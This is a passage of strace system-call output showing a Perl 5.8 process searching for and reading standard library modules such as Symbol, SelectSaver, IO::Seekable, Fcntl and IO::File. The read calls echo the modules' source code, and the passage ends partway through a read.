6823  07:15:42.817020 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817034 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817046 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817060 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817071 stat64("/usr/lib/perl5/Symbol.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817084 stat64("/usr/share/perl5/Symbol.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817096 stat64("/usr/share/perl5/Symbol.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817109 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817121 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817134 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817147 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
6823  07:15:42.817167 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.817182 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.817193 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.817210 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
6823  07:15:42.817577 read(8,  <unfinished ...>
6821  07:15:42.817596 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6821  07:15:42.817617 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6821  07:15:42.817633 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6821  07:15:42.817644 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6821  07:15:42.817656 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
6821  07:15:42.817670 waitpid(-1,  <unfinished ...>
6823  07:15:42.817695 <... read resumed> "", 4096) = 0
6823  07:15:42.817715 close(8)          = 0
6823  07:15:42.817824 stat64("/etc/perl/SelectSaver.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817841 stat64("/etc/perl/SelectSaver.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817854 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817867 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817881 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817894 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817908 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817920 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817934 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817946 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817959 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817972 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817986 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.817999 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
6823  07:15:42.818024 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.818039 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.818050 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.818069 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
6823  07:15:42.818193 brk(0x81d6000)    = 0x81d6000
6823  07:15:42.818199 read(8, "", 4096) = 0
6823  07:15:42.818199 close(8)          = 0
6823  07:15:42.818505 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
6823  07:15:42.819180 read(6, "", 4096) = 0
6823  07:15:42.837388 close(6)          = 0
6823  07:15:42.837401 stat64("/etc/perl/IO/Seekable.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837420 stat64("/etc/perl/IO/Seekable.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837434 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837448 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837462 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837476 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837490 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837502 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837515 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837528 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837541 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.837555 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
6823  07:15:42.837577 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.837594 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.837608 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.837627 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
6823  07:15:42.837877 stat64("/etc/perl/Fcntl.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.837893 stat64("/etc/perl/Fcntl.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.837907 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.837919 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.837933 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.837945 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.837960 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.837971 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.837984 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.838003 stat64("/usr/share/perl5/Fcntl.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.838017 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.838029 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
6823  07:15:42.838049 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.838064 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.838075 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.838094 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
6823  07:15:42.838248 brk(0x81f7000)    = 0x81f7000
6823  07:15:42.838481 read(8, "", 4096) = 0
6823  07:15:42.838527 close(8)          = 0
6823  07:15:42.838603 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
6823  07:15:42.838629 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6823  07:15:42.838659 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
6823  07:15:42.838674 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
6823  07:15:42.838767 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
6823  07:15:42.838787 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7dbe000
6823  07:15:42.838801 mmap2(0xb7dc1000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7dc1000
6823  07:15:42.838818 close(8)          = 0
6823  07:15:42.839181 read(6, "", 4096) = 0
6823  07:15:42.839201 close(6)          = 0
6823  07:15:42.839243 stat64("/etc/perl/IO/File.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839264 stat64("/etc/perl/IO/File.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839283 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839302 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839321 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839340 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839360 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839377 stat64("/usr/lib/perl5/IO/File.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839396 stat64("/usr/share/perl5/IO/File.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839432 stat64("/usr/share/perl5/IO/File.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839480 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.839515 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
6823  07:15:42.839546 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.839566 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.839582 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.839606 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, 